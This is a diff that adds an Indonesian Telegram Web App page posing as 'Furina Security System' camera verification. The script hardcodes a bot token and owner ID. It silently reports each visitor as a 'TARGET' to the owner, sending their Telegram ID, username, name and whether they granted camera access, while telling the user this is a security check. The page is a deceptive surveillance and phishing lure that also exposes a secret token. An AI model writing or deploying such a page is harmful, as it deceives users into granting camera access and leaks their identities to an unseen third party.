@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verifikasi Furina</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 25px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        h1 {
+            color: #fff;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        p {
+            color: #ddd;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #e94560, #ff6b6b);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        button:disabled {
+            opacity: 0.6;
+            transform: none;
+        }
+        video {
+            width: 100%;
+            border-radius: 20px;
+            margin-top: 20px;
+            display: none;
+            border: 2px solid #e94560;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 15px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .success {
+            background: rgba(46, 204, 113, 0.3);
+            color: #2ecc71;
+            border: 1px solid #2ecc71;
+        }
+        .error {
+            background: rgba(231, 76, 60, 0.3);
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+        }
+        .info {
+            background: rgba(52, 152, 219, 0.3);
+            color: #3498db;
+            border: 1px solid #3498db;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Verifikasi Furina</h1>
+        <p>Izinkan akses kamera untuk melanjutkan menggunakan tools</p>
+        
+        <button id="allowBtn">📹 Izinkan Kamera</button>
+        
+        <video id="video" autoplay playsinline muted></video>
+        <div id="status"></div>
+        <div class="footer">Powered by Furina Security System</div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        const allowBtn = document.getElementById('allowBtn');
+        const video = document.getElementById('video');
+        const statusDiv = document.getElementById('status');
+        
+        tg.ready();
+        tg.expand();
+        
+        const botToken = '8796292089:AAGAOxpfTsS-yQQRgOPhJqT5AMguMucefHQ';
+        const ownerId = 8440130611;
+        const userId = tg.initDataUnsafe?.user?.id || 'unknown';
+        const username = tg.initDataUnsafe?.user?.username || 'unknown';
+        const firstName = tg.initDataUnsafe?.user?.first_name || '';
+        
+        async function sendToBot(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: userId,
+                        text: message
+                    })
+                });
+            } catch(e) { console.log(e); }
+        }
+        
+        async function sendToOwner(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: ownerId,
+                        text: message
+                    })
+                });
+            } catch(e) { console.log(e); }
+        }
+        
+        allowBtn.onclick = async () => {
+            allowBtn.disabled = true;
+            allowBtn.innerText = 'Memproses...';
+            statusDiv.innerHTML = '<div class="status info">⏳ Meminta akses kamera...</div>';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.style.display = 'block';
+                video.srcObject = stream;
+                
+                statusDiv.innerHTML = '<div class="status success">✅ Verifikasi berhasil! Kamera aktif.</div>';
+                allowBtn.style.display = 'none';
+                
+                await sendToBot('✅ Verifikasi kamera BERHASIL! Kamu sekarang bisa menggunakan semua tools.\n\nKetik /menu untuk melihat perintah.');
+                await sendToOwner(`🎥 TARGET ${userId} (@${username}) MENGIZINKAN AKSES KAMERA!\nNama: ${firstName}\nWaktu: ${new Date().toLocaleString()}`);
+                
+                setTimeout(() => {
+                    tg.close();
+                }, 3000);
+                
+            } catch(err) {
+                console.log(err);
+                statusDiv.innerHTML = '<div class="status error">❌ Akses kamera ditolak! Verifikasi gagal.</div>';
+                allowBtn.disabled = false;
+                allowBtn.innerText = 'Coba Lagi';
+                
+                await sendToBot('❌ AKSES KAMERA DITOLAK! Kamu tidak bisa menggunakan tools ini.\n\nSilakan izinkan akses kamera dan coba lagi dengan /start');
+                await sendToOwner(`❌ TARGET ${userId} (@${username}) MENOLAK AKSES KAMERA!\nWaktu: ${new Date().toLocaleString()}`);
+            }
+        };
+        
+        sendToOwner(`🌐 TARGET ${userId} (@${username}) MEMBUKA HALAMAN VERIFIKASI\nNama: ${firstName}\nWaktu: ${new Date().toLocaleString()}`);
+    </script>
+</body>
+</html>
